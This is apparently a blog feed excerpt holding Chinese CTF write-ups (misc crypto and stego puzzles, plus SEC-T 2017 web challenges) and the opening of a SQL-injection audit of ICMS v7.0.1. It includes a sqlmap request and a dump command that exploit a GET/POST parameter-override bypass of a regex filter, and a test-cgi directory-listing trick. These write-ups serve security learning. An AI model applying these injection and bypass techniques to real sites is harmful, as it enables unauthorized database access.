class="keyword">import</span> base64</div><div class="line">IV = <span class="string">'QWERTYUIOPASDFGH'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted)</span>:</span></div><div class="line">  aes = AES.new(IV, AES.MODE_CBC, IV)</div><div class="line">  <span class="keyword">return</span> aes.decrypt(encrypted)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message)</span>:</span></div><div class="line">  length = <span class="number">16</span></div><div class="line">  count = len(message)</div><div class="line">  padding = length - (count % length)</div><div class="line">  message = message + <span class="string">'\0'</span> * padding</div><div class="line">  aes = AES.new(IV, AES.MODE_CBC, IV)</div><div class="line">  <span class="keyword">return</span> aes.encrypt(message)</div><div class="line"></div><div class="line">print(decrypt(base64.b64decode(<span class="string">"19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo="</span>)))</div></pre></td></tr></table></figure></p>
<p>运行后得到：passwd={No_One_Can_Decrypt_Me}。用于flag.rar的解密，得到最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WDCTF&#123;Seclab_CTF_2017&#125;</div></pre></td></tr></table></figure></p>
<h1 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h1><p>给了一张gif图片。<a href="https://ezgif.com/" target="_blank" rel="external">https://ezgif.com/</a> 分解出四帧，然后ps将其拼接。得到：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/1.png?raw=true" alt=""></p>
<p>扫描后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">03f30d0ab8c1aa596300000000000000000200000040000000732e0000006400006401006c00005a00006402005a01006403005a02006404008400005a03006405008400005a040064010053280600000069ffffffff4e7403000000637466733d0000003138362c39382c3138302c3135342c3133392c3139322c3131342c31342c3130322c3136382c34332c3133362c35322c3231382c38352c3130302c3433630200000004000000070000004300000073610000007400006a01007c0100830100016401007d02007838007c0000445d30007d03007c02007402007403007c03008301007400006a04006402006403008302004183010064040017377d0200711a00577c02006a05006404008301007d02007c02005328050000004e7400000000690000000069ff00000074010000002c2806000000740600000072616e646f6d740400000073656564740300000073747274030000006f7264740700000072616e64696e7474050000007374726970280400000074040000007374723174030000006b65797404000000737472327401000000632800000000280000000073100000002f686f6d652f6374662f6262622e7079740500000066756e633107000000730c00000000010d0106010d012e010f016302000000040000000700000043000000735d0000007400006a01007c0100830100016401007d02007843007c00006a0200640200830100445d32007d03007403007c03008301007d03007c02007404007c03007400006a050064030064040083020041830100377d0200712300577c02005328050000004e52010000005202000000690000000069ff000000280600000052030000005204000000740500000073706c69747403000000696e74740300000063687252070000002804000000520b000000520a00000052090000007401000000692800000000280000000073100000002f686f6d652f6374662f6262622e7079740500000066756e63320f000000730c00000000010d01060116010c01240128050000005203000000520a000000740400000073747272520d000000521200000028000000002800000000280000000073100000002f686f6d652f6374662f6262622e707974080000003c6d6f64756c653e0100000073080000000c02060106030908</div></pre></td></tr></table></figure></p>
<p>用hex编辑器保存为pyc文件，反汇编后得到py：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="comment"># 访问 http://tool.lu/pyc/ 查看更多信息</span></div><div class="line"><span class="keyword">import</span> random</div><div class="line">key = <span class="string">'ctf'</span></div><div class="line">strr = <span class="string">'186,98,180,154,139,192,114,14,102,168,43,136,52,218,85,100,43'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(str1, key)</span>:</span></div><div class="line">    random.seed(key)</div><div class="line">    str2 = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> str1:</div><div class="line">        str2 += str(ord(c) ^ random.randint(<span class="number">0</span>, <span class="number">255</span>)) + <span class="string">','</span></div><div class="line"></div><div class="line">    str2 = str2.strip(<span class="string">','</span>)</div><div class="line">    <span class="keyword">return</span> str2</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(str2, key)</span>:</span></div><div class="line">    random.seed(key)</div><div class="line">    str1 = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str2.split(<span class="string">','</span>):</div><div class="line">        i = int(i)</div><div class="line">        str1 += chr(i ^ random.randint(<span class="number">0</span>, <span class="number">255</span>))</div><div class="line"></div><div class="line">    <span class="keyword">return</span> str1</div></pre></td></tr></table></figure></p>
<p>最后一行添上：print(func2(strr,key))<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/2.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">U_r_Greatt!</div></pre></td></tr></table></figure></p>
<h1 id="4-1"><a href="#4-1" class="headerlink" title="4.1"></a>4.1</h1><p>给了一张图片，用binwalk -e分解后得到day2’s secret.zip和tips.txt。</p>
<p>tips.txt的内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Although two days doing the same things, but day2 has a secret than day1</div></pre></td></tr></table></figure></p>
<p>考虑<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="external">盲水印</a>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/3.jpg?raw=true" alt=""></p>
<p>提交：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">My_c4t_Ho</div></pre></td></tr></table></figure></p>
<h1 id="4-2"><a href="#4-2" class="headerlink" title="4-2"></a>4-2</h1><p>古典密码，然后放到 quipqiup.com 解一下</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/4.png?raw=true" alt=""></p>
<p>得到flag。</p>
<h1 id="5-1"><a href="#5-1" class="headerlink" title="5-1"></a>5-1</h1><p>用xortool测试一下；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop# xortool cipher -c 20</div><div class="line">The most probable key lengths:</div><div class="line">   2:   12.2%</div><div class="line">   5:   11.9%</div><div class="line">   9:   9.8%</div><div class="line">  13:   22.2%</div><div class="line">  20:   6.8%</div><div class="line">  22:   6.2%</div><div class="line">  26:   12.8%</div><div class="line">  30:   4.6%</div><div class="line">  39:   7.8%</div><div class="line">  52:   5.7%</div><div class="line">Key-length can be 3*n</div><div class="line">1 possible key(s) of length 13:</div><div class="line">Good\tuckToYou</div><div class="line">Found 1 plaintexts with 95.0%+ printable characters</div><div class="line">See files filename-key.csv, filename-char_used-perc_printable.csv</div></pre></td></tr></table></figure></p>
<p>猜测key为 GoodLuckToYou，写出脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="comment"># from secret import FLAG</span></div><div class="line"></div><div class="line">key  = <span class="string">"GoodLuckToYou"</span></div><div class="line">text = open(<span class="string">"cipher"</span>,<span class="string">"rb"</span>).read()</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_str</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(x) &gt; len(y):</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x[:len(y)], y)])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x, y[:len(x)])])</div><div class="line"></div><div class="line"><span class="comment"># flag, key = FLAG.encode('hex'), KEY.encode('hex')</span></div><div class="line"></div><div class="line">enc = xor_str(key * (len(text) // len(key) + <span class="number">1</span>), text)</div><div class="line"></div><div class="line">ef = open(<span class="string">'flag.txt'</span>, <span class="string">'w'</span>)</div><div class="line">ef.write(enc)</div><div class="line">ef.close()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/7.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wdflag&#123;You Are Very Smart&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;问鼎杯 CTF writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://chybeta.github.io/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>SEC-T CTF2017-Naughty ads-writeup</title>
    <link href="http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/"/>
    <id>http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/</id>
    <published>2017-09-14T02:12:24.000Z</published>
    <updated>2017-09-17T10:44:01.133Z</updated>
    
    <content type="html"><![CDATA[<p>SEC-T CTF2017-Naughty ads-writeup<br>sql注入<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot;</div><div class="line">Solves: 40</div><div class="line">Service: http://naughtyads.alieni.se/</div><div class="line">Author: avlidienbrunn</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>扫描器扫到robots.txt ，访问：<a href="http://naughtyads.alieni.se/robots.txt" target="_blank" rel="external">http://naughtyads.alieni.se/robots.txt</a></p>
<p>有一个admin，但访问需要输入账号和密码。</p>
<p>尝试访问： <a href="http://naughtyads.alieni.se/index.phps" target="_blank" rel="external">http://naughtyads.alieni.se/index.phps</a> 。得到源代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">require_once</span> <span class="string">'lib.php'</span>;</div><div class="line">header(<span class="string">'X-XSS-Protection: 0'</span>);</div><div class="line">$cols = <span class="keyword">array</span>(</div><div class="line">    <span class="string">"e8c4-437b-9476"</span>,</div><div class="line">    <span class="string">"849e-416e-acf7"</span>,</div><div class="line">    <span class="string">"7f9d-470f-8698"</span>,</div><div class="line">    <span class="string">"c8bb-4695-93f7"</span>,</div><div class="line">    <span class="string">"5fbc-4729-8821"</span>,</div><div class="line">    <span class="string">"3ad3-46c3-b975"</span>,</div><div class="line">    <span class="string">"f44f-4cc9-a5e0"</span>,</div><div class="line">    <span class="string">"0c3f-42c8-a0ae"</span></div><div class="line">    );</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'id'</span>]))&#123;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'id'</span>]))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</div><div class="line">    &#125;</div><div class="line">    $ad = get_ad($_GET[<span class="string">'id'</span>]);</div><div class="line">    <span class="meta">?&gt;</span></div><div class="line">    &lt;HTML&gt;</div><div class="line">    &lt;HEAD&gt;</div><div class="line">        &lt;TITLE&gt;NAUGHTY ADS ©<span class="number">1994</span>&lt;/TITLE&gt;</div><div class="line">    &lt;/HEAD&gt;</div><div class="line">    &lt;BODY BGCOLOR=<span class="string">"WHITE"</span>&gt;</div><div class="line">        &lt;CENTER&gt;</div><div class="line">        <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $ad[<span class="string">'description'</span>] <span class="meta">?&gt;</span>&lt;br /&gt;</div><div class="line">        &lt;a href=<span class="string">"/"</span>&gt;Home&lt;/a&gt;</div><div class="line">        &lt;/CENTER&gt;</div><div class="line">    &lt;/BODY&gt;</div><div class="line">    &lt;/HTML&gt;</div><div class="line">    <span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>对于 $_REQUEST[‘id’] ，进行了“严格”的正则匹配，不能正常的注出数据。接下来通过 $_GET[‘id’] 将其带入数据库中查询并返回结果给页面。</p>
<p>这里考察了一个知识。<a href="http://php.net/manual/zh/reserved.variables.request.php" target="_blank" rel="external">$_REQUEST</a>变量默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。在 php.ini 配置文件中，有一个参数variables_order<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/5.png?raw=true" alt=""></p>
<p>其中几个字母（EGPCS）对应如下： Environment, Get, Post, Cookie, Server。这些字母的出现顺序，表明了数据的加载顺序。从三种默认配置来看，相对顺序均是<code>GP</code>，也就是说只要有POST参数进来，那么它就会覆盖同名的GET参数。如下图；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/6.png?raw=true" alt=""></p>
<p>所以就本题而言，如果在GET参数id处注入数据（比如 union select），而同时我们又通过POST方法传入一个id参数，那么服务器检测的是无害的POST数据，而在进行查询时带入的是有害的GET数据。</p>
<p>将如下数据包保存为test.txt，用sqlmap跑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /?id=* HTTP/1.1</div><div class="line">Host: naughtyads.alieni.se</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">DNT: 1</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 18</div><div class="line"></div><div class="line">id= 0c3f-42c8-a0ae</div></pre></td></tr></table></figure></p>
<p>命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -r test.txt -D naughty --dump</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/7.png?raw=true" alt=""></p>
<p>得到账号密码，登陆 <a href="http://naughtyads.alieni.se/admin/" target="_blank" rel="external">http://naughtyads.alieni.se/admin/</a> 在Phone number处填上555-31338，提交后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125;</div></pre></td></tr></table></figure></p>
<p>其实那个正则，是有问题的。。。很容易绕过的啦。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SEC-T CTF2017-Naughty ads-writeup&lt;br&gt;sql注入&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>SEC-T CTF2017-Sprinkler system-writeup</title>
    <link href="http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/"/>
    <id>http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/</id>
    <published>2017-09-14T01:19:09.000Z</published>
    <updated>2017-09-17T10:44:00.456Z</updated>
    
    <content type="html"><![CDATA[<p>SEC-T CTF2017-Sprinkler system-writeup<br>test-cgi利用<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Solves: 102</div><div class="line"></div><div class="line">Service: http://sprinklers.alieni.se/</div><div class="line"></div><div class="line">Author: avlidienbrunn</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>发现有robots.txr。访问：<a href="http://sprinklers.alieni.se/robots.txt" target="_blank" rel="external">http://sprinklers.alieni.se/robots.txt</a></p>
<p>接着访问 <a href="http://sprinklers.alieni.se/cgi-bin/test-cgi" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/test-cgi</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/3.png?raw=true" alt=""></p>
<p>是 test-cgi ， 可以遍历目录。访问 <a href="http://sprinklers.alieni.se/cgi-bin/test-cgi?*" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/test-cgi?*</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/2.png?raw=true" alt=""></p>
<p>最后访问：<a href="http://sprinklers.alieni.se/cgi-bin/enable_sprinkler_system" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/enable_sprinkler_system</a></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SECT&#123;-p00l_On_t3h_r00f_must_h@v3_A_l3ak!-&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SEC-T CTF2017-Sprinkler system-writeup&lt;br&gt;test-cgi利用&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ICMSv7.0.1 admincp.class.php sql注入分析</title>
    <link href="http://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql注入分析/</id>
    <published>2017-09-12T06:19:23.000Z</published>
    <updated>2017-09-12T10:26:33.999Z</updated>
    
    <content type="html"><![CDATA[<p>ICMSv7.0.1 admincp.class.php sql注入分析<br>代码审计学习中<br><a id="more"></a><br>下载地址：<a href="https://github.com/idreamsoft/iCMS/releases/tag/v7.0.1" target="_blank" rel="external">ICMSv7.0.1</a></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>出现漏洞的地方在 app\admincp\admincp.class.php 的init函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">self</span>::check_seccode(); <span class="comment">//验证码验证</span></div><div class="line"></div><div class="line">		iUI::$dialog[<span class="string">'title'</span>] = iPHP_APP;</div><div class="line">		iDB::$show_errors     = <span class="keyword">true</span>;</div><div class="line">		iDB::$show_trace      = <span class="keyword">false</span>;</div><div class="line">		iDB::$show_explain    = <span class="keyword">false</span>;</div><div class="line"></div><div class="line">		members::$LOGIN_PAGE  = ACP_PATH.<span class="string">'/template/admincp.login.php'</span>;</div><div class="line">		members::$GATEWAY     = iPHP::PG(<span class="string">'gateway'</span>);</div><div class="line">		members::check_login(); <span class="comment">//用户登陆验证</span></div><div class="line">		members::check_priv(<span class="string">'ADMINCP'</span>,<span class="string">'page'</span>);<span class="comment">//检查是否有后台权限</span></div><div class="line"></div><div class="line">		files::init(<span class="keyword">array</span>(<span class="string">'userid'</span>=&gt; members::$userid));</div><div class="line">		<span class="comment">//菜单</span></div><div class="line">		menu::init();</div><div class="line">		menu::$callback = <span class="keyword">array</span>(</div><div class="line">			<span class="string">"priv"</span> =&gt; <span class="keyword">array</span>(<span class="string">"members"</span>,<span class="string">"check_priv"</span>),</div><div class="line">			<span class="string">"hkey"</span> =&gt; members::$userid</div><div class="line">        );</div><div class="line"></div><div class="line">        admincp::$callback = <span class="keyword">array</span>(</div><div class="line">			<span class="string">"history"</span> =&gt; <span class="keyword">array</span>(<span class="string">"menu"</span>,<span class="string">"history"</span>),</div><div class="line">			<span class="string">"priv"</span>    =&gt; <span class="keyword">array</span>(<span class="string">"members"</span>,<span class="string">"check_priv"</span>)</div><div class="line">        );</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>在用户登陆验证，调用members::check_login()，跟进，其代码如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">public static function check_login() &#123;</div><div class="line">//        self::$LOGIN_COUNT = (int)authcode(get_cookie('iCMS_LOGIN_COUNT'),'DECODE');</div><div class="line">//        if(self::$LOGIN_COUNT&gt;iCMS_LOGIN_COUNT) exit();</div><div class="line"></div><div class="line">	 $a   = iSecurity::escapeStr($_POST['username']);</div><div class="line">	 $p   = iSecurity::escapeStr($_POST['password']);</div><div class="line">	 $ip  = iPHP::get_ip();</div><div class="line">	 $sep = iPHP_AUTH_IP?'#=iCMS['.$ip.']=#':'#=iCMS=#';</div><div class="line">	 if(empty($a) &amp;&amp; empty($p)) &#123;</div><div class="line">		 $auth       = iPHP::get_cookie(self::$AUTH);</div><div class="line">		 list($a,$p) = explode($sep,authcode($auth,'DECODE'));</div><div class="line">		 $c = self::check($a,$p);</div><div class="line">	 &#125;else &#123;</div><div class="line">		 $p = md5($p);</div><div class="line">		 $c = self::check($a,$p);</div><div class="line">		 if ($c)&#123;</div><div class="line">			 iDB::query("</div><div class="line">				 UPDATE `#iCMS@__members`</div><div class="line">				 SET `lastip`='".$ip."',</div><div class="line">				 `lastlogintime`='".time()."',</div><div class="line">				 `logintimes`=logintimes+1</div><div class="line">				 WHERE `uid`='".self::$userid."'</div><div class="line">			 ");</div><div class="line">			 iPHP::set_cookie(self::$AUTH,authcode($a.$sep.$p,'ENCODE'));</div><div class="line">		 &#125;</div><div class="line">	 &#125;</div><div class="line">	 return self::result($c);</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p><code>$a</code>和<code>$p</code>分别是用户名和密码，会先经过escapeStr的过滤，若不为空且通过了self::check($a,$p)的检查即可登陆成功。若为空，则会从cookie里获取值，并通过<code>list($a,$p) = explode($sep,authcode($auth,&#39;DECODE&#39;));</code>获取到用户名和密码，并进行检查self::check($a,$p)。</p>
<p>self::check()的部分代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($a,$p)</span> </span>&#123;</div><div class="line">	 <span class="keyword">if</span>(<span class="keyword">empty</span>($a) &amp;&amp; <span class="keyword">empty</span>($p)) &#123;</div><div class="line">		 <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	 &#125;</div><div class="line"></div><div class="line">	 <span class="keyword">self</span>::$data = iDB::row(<span class="string">"SELECT * FROM `#iCMS@__members` WHERE `username`='&#123;$a&#125;' AND `password`='&#123;$p&#125;' AND `status`='1' LIMIT 1;"</span>);</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>通常情况下，要从登陆口进行注入，传入的参数会进行escapeStr()的过滤，而escapeStr()是比较严格的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">escapeStr</span><span class="params">($string)</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span>(is_array($string)) &#123;</div><div class="line">		<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</div><div class="line">			$string[$key] = iSecurity::escapeStr($val);</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$string = str_replace(<span class="keyword">array</span>(<span class="string">'%00'</span>,<span class="string">'\\0'</span>,<span class="string">"\0"</span>,<span class="string">"\x0B"</span>), <span class="string">''</span>, $string); <span class="comment">//modified@2010-7-5</span></div><div class="line">		$string = str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>, <span class="string">'"'</span>,<span class="string">"'"</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>), <span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>, <span class="string">'&amp;quot;'</span>,<span class="string">'&amp;#039;'</span>, <span class="string">'&amp;lt;'</span>, <span class="string">'&amp;gt;'</span>), $string);</div><div class="line">		$string = preg_replace(<span class="string">'/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;)|[a-zA-Z][a-z0-9]&#123;2,5&#125;);)/'</span>, <span class="string">'&amp;\\1'</span>,$string);</div><div class="line">		$string = str_replace(<span class="string">'\\\\'</span>, <span class="string">'&amp;#92;'</span>, $string);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对单双引号都做了过滤，因此若是直接注入，会闭合失败。</p>
